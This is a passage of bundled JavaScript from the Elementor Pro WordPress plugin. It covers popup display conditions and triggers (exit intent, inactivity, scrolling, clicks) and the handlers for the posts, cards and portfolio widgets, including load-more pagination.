  !*** ../modules/popup/assets/js/frontend/timing/logged-in.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'logged_in';
  }

  check() {
    const userConfig = elementorFrontend.config.user;

    if (!userConfig) {
      return true;
    }

    if ('all' === this.getTimingSetting('users')) {
      return false;
    }

    const userRolesInHideList = this.getTimingSetting('roles').filter(role => -1 !== userConfig.roles.indexOf(role));
    return !userRolesInHideList.length;
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/page-views.js":
/*!****************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/page-views.js ***!
  \****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'page_views';
  }

  check() {
    const pageViews = elementorFrontend.storage.get('pageViews'),
          name = this.getName();
    let initialPageViews = this.document.getStorage(name + '_initialPageViews');

    if (!initialPageViews) {
      this.document.setStorage(name + '_initialPageViews', pageViews);
      initialPageViews = pageViews;
    }

    return pageViews - initialPageViews >= this.getTimingSetting('views');
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/sessions.js":
/*!**************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/sessions.js ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'sessions';
  }

  check() {
    const sessions = elementorFrontend.storage.get('sessions'),
          name = this.getName();
    let initialSessions = this.document.getStorage(name + '_initialSessions');

    if (!initialSessions) {
      this.document.setStorage(name + '_initialSessions', sessions);
      initialSessions = sessions;
    }

    return sessions - initialSessions >= this.getTimingSetting('sessions');
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/sources.js":
/*!*************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/sources.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'sources';
  }

  check() {
    const sources = this.getTimingSetting('sources');

    if (3 === sources.length) {
      return true;
    }

    const referrer = document.referrer.replace(/https?:\/\/(?:www\.)?/, ''),
          isInternal = 0 === referrer.indexOf(location.host.replace('www.', ''));

    if (isInternal) {
      return -1 !== sources.indexOf('internal');
    }

    if (-1 !== sources.indexOf('external')) {
      return true;
    }

    if (-1 !== sources.indexOf('search')) {
      return /^(google|yahoo|bing|yandex|baidu)\./.test(referrer);
    }

    return false;
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/times.js":
/*!***********************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/times.js ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'times';
  }

  check() {
    const displayTimes = this.document.getStorage('times') || 0;
    return this.getTimingSetting('times') > displayTimes;
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/timing/url.js":
/*!*********************************************************!*\
  !*** ../modules/popup/assets/js/frontend/timing/url.js ***!
  \*********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/timing/base.js"));

class _default extends _base.default {
  getName() {
    return 'url';
  }

  check() {
    const url = this.getTimingSetting('url'),
          action = this.getTimingSetting('action'),
          referrer = document.referrer;

    if ('regex' !== action) {
      return 'hide' === action ^ -1 !== referrer.indexOf(url);
    }

    let regexp;

    try {
      regexp = new RegExp(url);
    } catch (e) {
      return false;
    }

    return regexp.test(referrer);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers.js":
/*!*******************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers.js ***!
  \*******************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _pageLoad = _interopRequireDefault(__webpack_require__(/*! ./triggers/page-load */ "../modules/popup/assets/js/frontend/triggers/page-load.js"));

var _scrolling = _interopRequireDefault(__webpack_require__(/*! ./triggers/scrolling */ "../modules/popup/assets/js/frontend/triggers/scrolling.js"));

var _scrollingTo = _interopRequireDefault(__webpack_require__(/*! ./triggers/scrolling-to */ "../modules/popup/assets/js/frontend/triggers/scrolling-to.js"));

var _click = _interopRequireDefault(__webpack_require__(/*! ./triggers/click */ "../modules/popup/assets/js/frontend/triggers/click.js"));

var _inactivity = _interopRequireDefault(__webpack_require__(/*! ./triggers/inactivity */ "../modules/popup/assets/js/frontend/triggers/inactivity.js"));

var _exitIntent = _interopRequireDefault(__webpack_require__(/*! ./triggers/exit-intent */ "../modules/popup/assets/js/frontend/triggers/exit-intent.js"));

class _default extends elementorModules.Module {
  constructor(settings, document) {
    super(settings);
    this.document = document;
    this.triggers = [];
    this.triggerClasses = {
      page_load: _pageLoad.default,
      scrolling: _scrolling.default,
      scrolling_to: _scrollingTo.default,
      click: _click.default,
      inactivity: _inactivity.default,
      exit_intent: _exitIntent.default
    };
    this.runTriggers();
  }

  runTriggers() {
    const settings = this.getSettings();
    jQuery.each(this.triggerClasses, (key, TriggerClass) => {
      if (!settings[key]) {
        return;
      }

      const trigger = new TriggerClass(settings, () => this.onTriggerFired());
      trigger.run();
      this.triggers.push(trigger);
    });
  }

  destroyTriggers() {
    this.triggers.forEach(trigger => trigger.destroy());
    this.triggers = [];
  }

  onTriggerFired() {
    this.document.showModal(true);
    this.destroyTriggers();
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/base.js":
/*!************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/base.js ***!
  \************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class _default extends elementorModules.Module {
  constructor(settings, callback) {
    super(settings);
    this.callback = callback;
  }

  getTriggerSetting(settingKey) {
    return this.getSettings(this.getName() + '_' + settingKey);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/click.js":
/*!*************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/click.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/triggers/base.js"));

class _default extends _base.default {
  constructor(...args) {
    super(...args);
    this.checkClick = this.checkClick.bind(this);
    this.clicksCount = 0;
  }

  getName() {
    return 'click';
  }

  checkClick() {
    this.clicksCount++;

    if (this.clicksCount === this.getTriggerSetting('times')) {
      this.callback();
    }
  }

  run() {
    elementorFrontend.elements.$body.on('click', this.checkClick);
  }

  destroy() {
    elementorFrontend.elements.$body.off('click', this.checkClick);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/exit-intent.js":
/*!*******************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/exit-intent.js ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/triggers/base.js"));

class _default extends _base.default {
  constructor(...args) {
    super(...args);
    this.detectExitIntent = this.detectExitIntent.bind(this);
  }

  getName() {
    return 'exit_intent';
  }

  detectExitIntent(event) {
    if (event.clientY <= 0) {
      this.callback();
    }
  }

  run() {
    elementorFrontend.elements.$window.on('mouseleave', this.detectExitIntent);
  }

  destroy() {
    elementorFrontend.elements.$window.off('mouseleave', this.detectExitIntent);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/inactivity.js":
/*!******************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/inactivity.js ***!
  \******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/triggers/base.js"));

class _default extends _base.default {
  constructor(...args) {
    super(...args);
    this.restartTimer = this.restartTimer.bind(this);
  }

  getName() {
    return 'inactivity';
  }

  run() {
    this.startTimer();
    elementorFrontend.elements.$document.on('keypress mousemove', this.restartTimer);
  }

  startTimer() {
    this.timeOut = setTimeout(this.callback, this.getTriggerSetting('time') * 1000);
  }

  clearTimer() {
    clearTimeout(this.timeOut);
  }

  restartTimer() {
    this.clearTimer();
    this.startTimer();
  }

  destroy() {
    this.clearTimer();
    elementorFrontend.elements.$document.off('keypress mousemove', this.restartTimer);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/page-load.js":
/*!*****************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/page-load.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/triggers/base.js"));

class _default extends _base.default {
  getName() {
    return 'page_load';
  }

  run() {
    this.timeout = setTimeout(this.callback, this.getTriggerSetting('delay') * 1000);
  }

  destroy() {
    clearTimeout(this.timeout);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/scrolling-to.js":
/*!********************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/scrolling-to.js ***!
  \********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/triggers/base.js"));

class _default extends _base.default {
  getName() {
    return 'scrolling_to';
  }

  run() {
    let $targetElement;

    try {
      $targetElement = jQuery(this.getTriggerSetting('selector'));
    } catch (e) {
      return;
    }

    this.waypointInstance = elementorFrontend.waypoint($targetElement, this.callback)[0];
  }

  destroy() {
    if (this.waypointInstance) {
      this.waypointInstance.destroy();
    }
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/popup/assets/js/frontend/triggers/scrolling.js":
/*!*****************************************************************!*\
  !*** ../modules/popup/assets/js/frontend/triggers/scrolling.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/popup/assets/js/frontend/triggers/base.js"));

class _default extends _base.default {
  constructor(...args) {
    super(...args);
    this.checkScroll = this.checkScroll.bind(this);
    this.lastScrollOffset = 0;
  }

  getName() {
    return 'scrolling';
  }

  checkScroll() {
    const scrollDirection = scrollY > this.lastScrollOffset ? 'down' : 'up',
          requestedDirection = this.getTriggerSetting('direction');
    this.lastScrollOffset = scrollY;

    if (scrollDirection !== requestedDirection) {
      return;
    }

    if ('up' === scrollDirection) {
      this.callback();
      return;
    }

    const fullScroll = elementorFrontend.elements.$document.height() - innerHeight,
          scrollPercent = scrollY / fullScroll * 100;

    if (scrollPercent >= this.getTriggerSetting('offset')) {
      this.callback();
    }
  }

  run() {
    elementorFrontend.elements.$window.on('scroll', this.checkScroll);
  }

  destroy() {
    elementorFrontend.elements.$window.off('scroll', this.checkScroll);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/posts/assets/js/frontend/frontend-legacy.js":
/*!**************************************************************!*\
  !*** ../modules/posts/assets/js/frontend/frontend-legacy.js ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _posts = _interopRequireDefault(__webpack_require__(/*! ./handlers/posts */ "../modules/posts/assets/js/frontend/handlers/posts.js"));

var _cards = _interopRequireDefault(__webpack_require__(/*! ./handlers/cards */ "../modules/posts/assets/js/frontend/handlers/cards.js"));

var _portfolio = _interopRequireDefault(__webpack_require__(/*! ./handlers/portfolio */ "../modules/posts/assets/js/frontend/handlers/portfolio.js"));

var _loadMore = _interopRequireDefault(__webpack_require__(/*! ./handlers/load-more */ "../modules/posts/assets/js/frontend/handlers/load-more.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    ['classic', 'full_content', 'cards'].forEach(skinName => {
      elementorFrontend.elementsHandler.attachHandler('posts', _loadMore.default, skinName);
    });
    elementorFrontend.elementsHandler.attachHandler('posts', _posts.default, 'classic');
    elementorFrontend.elementsHandler.attachHandler('posts', _posts.default, 'full_content');
    elementorFrontend.elementsHandler.attachHandler('posts', _cards.default, 'cards');
    elementorFrontend.elementsHandler.attachHandler('portfolio', _portfolio.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/posts/assets/js/frontend/handlers/cards.js":
/*!*************************************************************!*\
  !*** ../modules/posts/assets/js/frontend/handlers/cards.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _posts = _interopRequireDefault(__webpack_require__(/*! ./posts */ "../modules/posts/assets/js/frontend/handlers/posts.js"));

var _default = _posts.default.extend({
  getSkinPrefix() {
    return 'cards_';
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/posts/assets/js/frontend/handlers/load-more.js":
/*!*****************************************************************!*\
  !*** ../modules/posts/assets/js/frontend/handlers/load-more.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class LoadMore extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        postsContainer: '.elementor-posts-container',
        loadMoreButton: '.elementor-button',
        loadMoreSpinnerWrapper: '.e-load-more-spinner',
        loadMoreSpinner: '.e-load-more-spinner i, .e-load-more-spinner svg',
        loadMoreAnchor: '.e-load-more-anchor'
      },
      classes: {
        loadMoreSpin: 'eicon-animation-spin',
        loadMoreIsLoading: 'e-load-more-pagination-loading',
        loadMorePaginationEnd: 'e-load-more-pagination-end',
        loadMoreNoSpinner: 'e-load-more-no-spinner'
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors');
    return {
      postsWidgetWrapper: this.$element[0],
      postsContainer: this.$element[0].querySelector(selectors.postsContainer),
      loadMoreButton: this.$element[0].querySelector(selectors.loadMoreButton),
      loadMoreSpinnerWrapper: this.$element[0].querySelector(selectors.loadMoreSpinnerWrapper),
      loadMoreSpinner: this.$element[0].querySelector(selectors.loadMoreSpinner),
      loadMoreAnchor: this.$element[0].querySelector(selectors.loadMoreAnchor)
    };
  }

  bindEvents() {
    super.bindEvents(); // Handle load more functionality for on-click type.

    if (!this.elements.loadMoreButton) {
      return;
    }

    this.elements.loadMoreButton.addEventListener('click', event => {
      if (this.isLoading) {
        return;
      }

      event.preventDefault();
      this.handlePostsQuery();
    });
  }

  onInit() {
    super.onInit();
    this.classes = this.getSettings('classes');
    this.isLoading = false;
    const paginationType = this.getElementSettings('pagination_type');

    if ('load_more_on_click' !== paginationType && 'load_more_infinite_scroll' !== paginationType) {
      return;
    }

    this.isInfinteScroll = 'load_more_infinite_scroll' === paginationType; // When spinner is not available, the button's text should not be hidden.

    this.isSpinnerAvailable = this.getElementSettings('load_more_spinner').value;

    if (!this.isSpinnerAvailable) {
      this.elements.postsWidgetWrapper.classList.add(this.classes.loadMoreNoSpinner);
    }

    if (this.isInfinteScroll) {
      this.handleInfiniteScroll();
    } else if (this.elements.loadMoreSpinnerWrapper) {
      // Instead of creating 2 spinners for on-click and infinity-scroll, one spinner will be used so it should be appended to the button in on-click mode.
      this.elements.loadMoreButton.insertAdjacentElement('beforeEnd', this.elements.loadMoreSpinnerWrapper);
    } // Set the post id and element id for the ajax request.


    this.elementId = this.getID();
    this.postId = elementorFrontendConfig.post.id; // Set the current page and last page for handling the load more post and when no more posts to show.

    this.currentPage = parseInt(this.elements.loadMoreAnchor.getAttribute('data-page'));
    this.maxPage = parseInt(this.elements.loadMoreAnchor.getAttribute('data-max-page'));

    if (this.currentPage === this.maxPage) {
      this.handleUiWhenNoPosts();
    }
  } // Handle load more functionality for infinity-scroll type.


  handleInfiniteScroll() {
    if (this.isEdit) {
      return;
    }

    this.observer = elementorModules.utils.Scroll.scrollObserver({
      callback: event => {
        if (!event.isInViewport || this.isLoading) {
          return;
        } // When the observer is triggered it won't be triggered without scrolling, but sometimes there will be no scrollbar to trigger it again.


        this.observer.unobserve(this.elements.loadMoreAnchor);
        this.handlePostsQuery().then(() => {
          if (this.currentPage !== this.maxPage) {
            this.observer.observe(this.elements.loadMoreAnchor);
          }
        });
      }
    });
    this.observer.observe(this.elements.loadMoreAnchor);
  }

  handleUiBeforeLoading() {
    this.isLoading = true;

    if (this.elements.loadMoreSpinner) {
      this.elements.loadMoreSpinner.classList.add(this.classes.loadMoreSpin);
    }

    this.elements.postsWidgetWrapper.classList.add(this.classes.loadMoreIsLoading);
  }

  handleUiAfterLoading() {
    this.isLoading = false;

    if (this.elements.loadMoreSpinner) {
      this.elements.loadMoreSpinner.classList.remove(this.classes.loadMoreSpin);
    }

    if (this.isInfinteScroll && this.elements.loadMoreSpinnerWrapper) {
      // Since the spinner has to be shown after the new content (posts), it should be appended after the anchor element.
      this.elements.loadMoreAnchor.insertAdjacentElement('afterend', this.elements.loadMoreSpinnerWrapper);
    }

    this.elements.postsWidgetWrapper.classList.remove(this.classes.loadMoreIsLoading);
  }

  handleUiWhenNoPosts() {
    this.elements.postsWidgetWrapper.classList.add(this.classes.loadMorePaginationEnd);
  }

  handleSuccessFetch(result) {
    this.handleUiAfterLoading();
    const html = document.createElement('div');
    html.innerHTML = result.content;
    const posts = html.querySelectorAll('.elementor-posts-container > article'); // Converting HTMLCollection to an Array and iterate it.

    const postsHTML = [...posts].reduce((accumulator, post) => {
      return accumulator + post.outerHTML;
    }, '');
    this.elements.postsContainer.insertAdjacentHTML('beforeend', postsHTML);
    this.elements.loadMoreAnchor.setAttribute('data-page', this.currentPage);

    if (this.currentPage === this.maxPage) {
      this.handleUiWhenNoPosts();
    }
  }

  handlePostsQuery() {
    this.handleUiBeforeLoading();
    this.currentPage++;
    const restUrl = `${ElementorProFrontendConfig.urls.rest}elementor-pro/v1/posts-widget?post_id=${this.postId}&element_id=${this.elementId}&page=${this.currentPage}`;
    return fetch(restUrl).then(response => response.json()).then(result => {
      this.handleSuccessFetch(result);
    });
  }

}

exports.default = LoadMore;

/***/ }),

/***/ "../modules/posts/assets/js/frontend/handlers/portfolio.js":
/*!*****************************************************************!*\
  !*** ../modules/posts/assets/js/frontend/handlers/portfolio.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _posts = _interopRequireDefault(__webpack_require__(/*! ./posts */ "../modules/posts/assets/js/frontend/handlers/posts.js"));

var _default = _posts.default.extend({
  isActive(settings) {
    return settings.$element.find('.elementor-portfolio').length;
  },

  getSkinPrefix() {
    return '';
  },

  getDefaultSettings() {
    var settings = _posts.default.prototype.getDefaultSettings.apply(this, arguments);

    settings.transitionDuration = 450;
    jQuery.extend(settings.classes, {
      active: 'elementor-active',
      item: 'elementor-portfolio-item',
      ghostItem: 'elementor-portfolio-ghost-item'
    });
    return settings;
  },

  getDefaultElements() {
    var elements = _posts.default.prototype.getDefaultElements.apply(this, arguments);

    elements.$filterButtons = this.$element.find('.elementor-portfolio__filter');
    return elements;
  },

  getOffset(itemIndex, itemWidth, itemHeight) {
    var settings = this.getSettings(),
        itemGap = this.elements.$postsContainer.width() / settings.colsCount - itemWidth;
    itemGap += itemGap / (settings.colsCount - 1);
    return {
      start: (itemWidth + itemGap) * (itemIndex % settings.colsCount),
      top: (itemHeight + itemGap) * Math.floor(itemIndex / settings.colsCount)
    };
  },

  getClosureMethodsNames() {
    var baseClosureMethods = _posts.default.prototype.getClosureMethodsNames.apply(this, arguments);

    return baseClosureMethods.concat(['onFilterButtonClick']);
  },

  filterItems(term) {
    var $posts = this.elements.$posts,
        activeClass = this.getSettings('classes.active'),
        termSelector = '.elementor-filter-' + term;

    if ('__all' === term) {
      $posts.addClass(activeClass);
      return;
    }

    $posts.not(termSelector).removeClass(activeClass);
    $posts.filter(termSelector).addClass(activeClass);
  },

  removeExtraGhostItems() {
    var settings = this.getSettings(),
        $shownItems = this.elements.$posts.filter(':visible'),
        emptyColumns = (settings.colsCount - $shownItems.length % settings.colsCount) % settings.colsCount,
        $ghostItems = this.elements.$postsContainer.find('.' + settings.classes.ghostItem);
    $ghostItems.slice(emptyColumns).remove();
  },

  handleEmptyColumns() {
    this.removeExtraGhostItems();
    var settings = this.getSettings(),
        $shownItems = this.elements.$posts.filter(':visible'),
        $ghostItems = this.elements.$postsContainer.find('.' + settings.classes.ghostItem),
        emptyColumns = (settings.colsCount - ($shownItems.length + $ghostItems.length) % settings.colsCount) % settings.colsCount;

    for (var i = 0; i < emptyColumns; i++) {
      this.elements.$postsContainer.append(jQuery('<div>', {
        class: settings.classes.item + ' ' + settings.classes.ghostItem
      }));
    }
  },

  showItems($activeHiddenItems) {
    $activeHiddenItems.show();
    setTimeout(function () {
      $activeHiddenItems.css({
        opacity: 1
      });
    });
  },

  hideItems($inactiveShownItems) {
    $inactiveShownItems.hide();
  },

  arrangeGrid() {
    var $ = jQuery,
        self = this,
        settings = self.getSettings(),
        $activeItems = self.elements.$posts.filter('.' + settings.classes.active),
        $inactiveItems = self.elements.$posts.not('.' + settings.classes.active),
        $shownItems = self.elements.$posts.filter(':visible'),
        $activeOrShownItems = $activeItems.add($shownItems),
        $activeShownItems = $activeItems.filter(':visible'),
        $activeHiddenItems = $activeItems.filter(':hidden'),
        $inactiveShownItems = $inactiveItems.filter(':visible'),
        itemWidth = $shownItems.outerWidth(),
        itemHeight = $shownItems.outerHeight();
    self.elements.$posts.css('transition-duration', settings.transitionDuration + 'ms');
    self.showItems($activeHiddenItems);

    if (self.isEdit) {
      self.fitImages();
    }

    self.handleEmptyColumns();

    if (self.isMasonryEnabled()) {
      self.hideItems($inactiveShownItems);
      self.showItems($activeHiddenItems);
      self.handleEmptyColumns();
      self.runMasonry();
      return;
    }

    $inactiveShownItems.css({
      opacity: 0,
      transform: 'scale3d(0.2, 0.2, 1)'
    });
    $activeShownItems.each(function () {
      var $item = $(this),
          currentOffset = self.getOffset($activeOrShownItems.index($item), itemWidth, itemHeight),
          requiredOffset = self.getOffset($shownItems.index($item), itemWidth, itemHeight);

      if (currentOffset.start === requiredOffset.start && currentOffset.top === requiredOffset.top) {
        return;
      }

      requiredOffset.start -= currentOffset.start;
      requiredOffset.top -= currentOffset.top;

      if (elementorFrontend.config.is_rtl) {
        requiredOffset.start *= -1;
      }

      $item.css({
        transitionDuration: '',
        transform: 'translate3d(' + requiredOffset.start + 'px, ' + requiredOffset.top + 'px, 0)'
      });
    });
    setTimeout(function () {
      $activeItems.each(function () {
        var $item = $(this),
            currentOffset = self.getOffset($activeOrShownItems.index($item), itemWidth, itemHeight),
            requiredOffset = self.getOffset($activeItems.index($item), itemWidth, itemHeight);
        $item.css({
          transitionDuration: settings.transitionDuration + 'ms'
        });
        requiredOffset.start -= currentOffset.start;
        requiredOffset.top -= currentOffset.top;

        if (elementorFrontend.config.is_rtl) {
          requiredOffset.start *= -1;
        }

        setTimeout(function () {
          $item.css('transform', 'translate3d(' + requiredOffset.start + 'px, ' + requiredOffset.top + 'px, 0)');
        });
      });
    });
    setTimeout(function () {
      self.hideItems($inactiveShownItems);
      $activeItems.css({
        transitionDuration: '',
        transform: 'translate3d(0px, 0px, 0px)'
      });
      self.handleEmptyColumns();
    }, settings.transitionDuration);
  },

  activeFilterButton(filter) {
    var activeClass = this.getSettings('classes.active'),
        $filterButtons = this.elements.$filterButtons,
        $button = $filterButtons.filter('[data-filter="' + filter + '"]');
    $filterButtons.removeClass(activeClass);
    $button.addClass(activeClass);
  },

  setFilter(filter) {
    this.activeFilterButton(filter);
    this.filterItems(filter);
    this.arrangeGrid();
  },

  refreshGrid() {
    this.setColsCountSettings();
    this.arrangeGrid();
  },

  bindEvents() {
    _posts.default.prototype.bindEvents.apply(this, arguments);

    this.elements.$filterButtons.on('click', this.onFilterButtonClick);
  },

  isMasonryEnabled() {
    return !!this.getElementSettings('masonry');
  },

  run() {
    _posts.default.prototype.run.apply(this, arguments);

    this.setColsCountSettings();
    this.setFilter('__all');
    this.handleEmptyColumns();
  },

  onFilterButtonClick(event) {
    this.setFilter(jQuery(event.currentTarget).data('filter'));
  },

  onWindowResize() {
    _posts.default.prototype.onWindowResize.apply(this, arguments);

    this.refreshGrid();
  },

  onElementChange(propertyName) {
    _posts.default.prototype.onElementChange.apply(this, arguments);

    if ('classic_item_ratio' === propertyName) {
      this.refreshGrid();
    }
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/posts/assets/js/frontend/handlers/posts.js":
/*!*************************************************************!*\
  !*** ../modules/posts/assets/js/frontend/handlers/posts.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _default = elementorModules.frontend.handlers.Base.extend({
  getSkinPrefix() {
    return 'classic_';
  },

  bindEvents() {
    var cid = this.getModelCID();
    elementorFrontend.addListenerOnce(cid, 'resize', this.onWindowResize);
  },

  getClosureMethodsNames() {
    return elementorModules.frontend.handlers.Base.prototype.getClosureMethodsNames.apply(this, arguments).concat(['fitImages', 'onWindowResize', 'runMasonry']);
  },

  getDefaultSettings() {
    return {
      classes: {
        fitHeight: 'elementor-fit-height',
        hasItemRatio: 'elementor-has-item-ratio'
      },
      selectors: {
